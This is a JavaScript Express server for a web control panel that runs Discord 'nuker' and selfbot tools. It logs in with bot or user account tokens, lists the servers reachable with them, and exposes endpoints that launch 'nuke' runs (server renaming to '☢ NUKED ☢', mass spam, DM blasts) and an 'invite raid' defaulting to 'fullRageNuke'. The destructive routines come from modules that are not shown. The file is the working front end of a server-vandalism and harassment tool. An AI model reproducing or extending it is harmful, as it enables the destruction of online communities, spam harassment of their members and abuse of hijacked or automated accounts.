// lang: JavaScript, file: api/server.js, target: Node.js 18+, Vercel
// Socket.io reemplazado con polling — Vercel no soporta WebSockets

const express  = require('express');
const path     = require('path');

const { Client: BotClient, GatewayIntentBits } = require('discord.js');
const { Client: SelfClient } = require('discord.js-selfbot-v13');
const Nuker     = require('../nuker');
const SelfNuker = require('../selfnuker');

const app = express();

// ── estado en módulo global (persiste mientras la instancia esté caliente) ───
let botClient  = null, nuker     = null;
let selfClient = null, selfNuker = null;

// log buffer — polling en lugar de socket.io
const logBuffer = [];
const MAX_LOGS  = 500;

function log(type, msg) {
    logBuffer.push({ type, time: Date.now(), msg });
    if (logBuffer.length > MAX_LOGS) logBuffer.shift();
    console.log(`[${type.toUpperCase()}] ${msg}`);
}

// ── middleware ────────────────────────────────────────────────────────────────
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

// ── LOGS endpoint (polling cada 500ms desde el cliente) ───────────────────────
app.get('/api/logs', (req, res) => {
    const since = parseInt(req.query.since) || 0;
    res.json({ logs: logBuffer.filter(l => l.time > since) });
});

// ── health ────────────────────────────────────────────────────────────────────
app.get('/health', (_, res) => res.json({ ok: true }));

// ── BOT ───────────────────────────────────────────────────────────────────────

app.post('/api/bot/connect', async (req, res) => {
    const { token } = req.body;
    if (!token) return res.json({ ok: false, error: 'no token' });
    try {
        if (botClient) { botClient.destroy(); botClient = null; }
        const client = new BotClient({
            intents: [
                GatewayIntentBits.Guilds,
                GatewayIntentBits.GuildMembers,
                GatewayIntentBits.GuildBans,
                GatewayIntentBits.GuildVoiceStates,
                GatewayIntentBits.GuildWebhooks,
            ]
        });
        await new Promise((resolve, reject) => {
            const t = setTimeout(() => reject(new Error('login timeout')), 10000);
            client.once('ready', () => { clearTimeout(t); resolve(); });
            client.once('error', e => { clearTimeout(t); reject(e); });
            client.login(token).catch(e => { clearTimeout(t); reject(e); });
        });
        botClient = client;
        nuker = new Nuker(client, m => log('bot', m));
        log('bot', `connected: ${client.user.tag} | guilds: ${client.guilds.cache.size}`);
        res.json({
            ok: true,
            tag: client.user.tag,
            guilds: client.guilds.cache.map(g => ({ id: g.id, name: g.name, memberCount: g.memberCount })),
        });
    } catch (e) { res.json({ ok: false, error: e.message }); }
});

app.get('/api/bot/guilds', (req, res) => {
    if (!botClient) return res.json({ ok: false, error: 'not connected' });
    res.json({ ok: true, guilds: botClient.guilds.cache.map(g => ({ id: g.id, name: g.name, memberCount: g.memberCount })) });
});

app.get('/api/bot/guild/:id', async (req, res) => {
    if (!botClient) return res.json({ ok: false, error: 'not connected' });
    const guild = botClient.guilds.cache.get(req.params.id);
    if (!guild) return res.json({ ok: false, error: 'guild not found' });
    try {
        await guild.members.fetch();
        res.json({ ok: true, guild: {
            id: guild.id, name: guild.name, memberCount: guild.memberCount,
            channelCount: guild.channels.cache.size, roleCount: guild.roles.cache.size,
            ownerId: guild.ownerId, boostLevel: guild.premiumTier,
        }});
    } catch (e) { res.json({ ok: false, error: e.message }); }
});

app.post('/api/bot/nuke', async (req, res) => {
    const { guildId, operations, spamName, spamCount, serverName } = req.body;
    if (!botClient || !nuker) return res.json({ ok: false, error: 'not connected' });
    const guild = botClient.guilds.cache.get(guildId);
    if (!guild) return res.json({ ok: false, error: 'guild not found' });
    nuker._spamName   = spamName   || 'nuked';
    nuker._spamCount  = +spamCount || 50;
    nuker._serverName = serverName || '☢ NUKED ☢';
    // responde inmediato, el nuke corre async
    res.json({ ok: true });
    nuker.execute(guild, operations).catch(e => log('bot', `execute error: ${e.message}`));
});

// ── SELFBOT ───────────────────────────────────────────────────────────────────

app.post('/api/self/connect', async (req, res) => {
    const { token } = req.body;
    if (!token) return res.json({ ok: false, error: 'no token' });
    try {
        if (selfClient) { selfClient.destroy(); selfClient = null; }
        const client = new SelfClient({ checkUpdate: false });
        await new Promise((resolve, reject) => {
            const t = setTimeout(() => reject(new Error('login timeout')), 10000);
            client.once('ready', () => { clearTimeout(t); resolve(); });
            client.once('error', e => { clearTimeout(t); reject(e); });
            client.login(token).catch(e => { clearTimeout(t); reject(e); });
        });
        selfClient = client;
        selfNuker  = new SelfNuker(client, m => log('self', m));
        log('self', `connected: ${client.user.tag} | guilds: ${client.guilds.cache.size}`);
        res.json({
            ok: true,
            tag: client.user.tag,
            guilds: client.guilds.cache.map(g => ({ id: g.id, name: g.name, memberCount: g.memberCount ?? 0 })),
        });
    } catch (e) { res.json({ ok: false, error: e.message }); }
});

app.get('/api/self/guilds', (req, res) => {
    if (!selfClient) return res.json({ ok: false, error: 'not connected' });
    res.json({ ok: true, guilds: selfClient.guilds.cache.map(g => ({ id: g.id, name: g.name, memberCount: g.memberCount ?? 0 })) });
});

app.get('/api/self/guild/:id', async (req, res) => {
    if (!selfClient) return res.json({ ok: false, error: 'not connected' });
    const guild = selfClient.guilds.cache.get(req.params.id);
    if (!guild) return res.json({ ok: false, error: 'guild not found' });
    try {
        await guild.members.fetch().catch(() => {});
        res.json({ ok: true, guild: {
            id: guild.id, name: guild.name, memberCount: guild.memberCount ?? 0,
            channelCount: guild.channels.cache.size, roleCount: guild.roles.cache.size,
            ownerId: guild.ownerId,
        }});
    } catch (e) { res.json({ ok: false, error: e.message }); }
});

app.post('/api/self/nuke', async (req, res) => {
    const { guildId, operations, spamMsg, spamCount, spamName, serverName, dmMsg } = req.body;
    if (!selfClient || !selfNuker) return res.json({ ok: false, error: 'not connected' });
    const guild = selfClient.guilds.cache.get(guildId);
    if (!guild) return res.json({ ok: false, error: 'guild not found' });
    res.json({ ok: true });
    selfNuker.execute(guild, operations, { spamMsg, spamCount, spamName, serverName, dmMsg })
        .catch(e => log('self', `execute error: ${e.message}`));
});

app.post('/api/self/raid', async (req, res) => {
    const { inviteCode, operations, config } = req.body;
    if (!selfClient || !selfNuker) return res.json({ ok: false, error: 'not connected' });
    if (!inviteCode) return res.json({ ok: false, error: 'no invite code' });
    res.json({ ok: true });
    selfNuker.inviteRaid(inviteCode, operations || ['fullRageNuke'], config || {})
        .catch(e => log('self', `raid error: ${e.message}`));
});

app.post('/api/self/username', async (req, res) => {
    const { name } = req.body;
    if (!selfClient) return res.json({ ok: false, error: 'not connected' });
    try {
        await selfClient.user.setUsername(name);
        log('self', `username → ${name}`);
        res.json({ ok: true });
    } catch (e) { res.json({ ok: false, error: e.message }); }
});

// ── START (local dev) ─────────────────────────────────────────────────────────
if (require.main === module) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => console.log(`☢  http://localhost:${PORT}`));
}

module.exports = app;
